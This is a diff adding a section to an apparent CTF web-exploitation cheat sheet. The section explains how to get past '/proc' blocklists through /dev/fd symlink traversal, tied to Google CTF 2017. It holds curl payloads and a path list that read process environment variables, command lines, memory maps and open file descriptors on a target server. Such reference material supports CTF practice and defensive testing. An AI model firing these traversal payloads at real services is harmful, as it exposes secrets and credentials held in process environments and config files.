@@ -8,6 +8,7 @@
   - [Brace Stripping](#brace-stripping)
   - [Double URL Encoding](#double-url-encoding)
   - [Python os.path.join](#python-ospathjoin)
+- [/dev/fd Symlink to Bypass /proc Filter (Google CTF 2017)](#devfd-symlink-to-bypass-proc-filter-google-ctf-2017)
 - [Flask/Werkzeug Debug Mode Exploitation](#flaskwerkzeug-debug-mode-exploitation)
 - [XXE with External DTD Filter Bypass](#xxe-with-external-dtd-filter-bypass)
 - [Path Traversal: URL-Encoded Slash Bypass](#path-traversal-url-encoded-slash-bypass)
@@ -111,6 +112,41 @@ zip -y exploit.zip file.txt
 
 ### Python os.path.join
 `os.path.join('/app/public', '/etc/passwd')` → `/etc/passwd` (absolute path ignores prefix)
+
+---
+
+## /dev/fd Symlink to Bypass /proc Filter (Google CTF 2017)
+
+**Pattern:** When an application filters `/proc` in file read parameters to prevent access to process information, `/dev/fd` provides an alternative path since it is a symlink to `/proc/self/fd` on Linux.
+
+```bash
+# Bypass /proc filter to read environment variables
+curl "http://target/?f=/dev/fd/../environ"
+# /dev/fd -> /proc/self/fd, then ../ traverses to /proc/self/
+
+# Read command line
+curl "http://target/?f=/dev/fd/../cmdline"
+
+# Read memory maps
+curl "http://target/?f=/dev/fd/../maps"
+
+# Read specific file descriptor contents
+curl "http://target/?f=/dev/fd/0"   # stdin
+curl "http://target/?f=/dev/fd/1"   # stdout
+curl "http://target/?f=/dev/fd/3"   # often a database or config file
+```
+
+**Other /proc filter bypass paths:**
+```text
+/dev/fd/../environ         # → /proc/self/environ
+/dev/fd/../cmdline         # → /proc/self/cmdline
+/dev/fd/../maps            # → /proc/self/maps
+/dev/fd/../status          # → /proc/self/status
+/dev/fd/../cwd/app.py      # → /proc/self/cwd/app.py (working dir)
+/dev/stdin/../environ      # /dev/stdin → /proc/self/fd/0, then ../
+```
+
+**Key insight:** `/dev/fd` is a symlink to `/proc/self/fd` on Linux. Traversing up with `../` reaches `/proc/self/`, bypassing blocklist checks for the literal string `/proc`. Similarly, `/dev/stdin`, `/dev/stdout`, and `/dev/stderr` link into `/proc/self/fd/` and can be used as traversal pivot points. Always test these alternatives when `/proc` is blacklisted.
 
 ---
 
